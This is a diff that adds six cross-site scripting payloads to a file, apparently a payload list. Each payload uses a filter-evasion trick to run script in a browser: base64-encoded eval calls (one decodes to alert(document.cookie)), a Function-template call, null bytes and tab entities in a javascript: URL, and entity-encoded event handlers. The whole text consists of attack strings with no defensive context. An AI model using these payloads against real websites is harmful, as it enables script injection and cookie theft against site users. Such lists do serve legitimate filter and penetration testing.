@@ -1,0 +1,6 @@
+<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>
+<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
+<svg onload='new Function`[“_Y000!_”].find(al\u0065rt)`'>
+<img/src=`%00`%20onerror=this.onerror=confirm(1)
+<iframe %00 src=”&Tab;javascript:prompt(1)&Tab;”%00>
+<input/onmouseover=”javaSCRIPT&colon;confirm&lpar;1&rpar;”
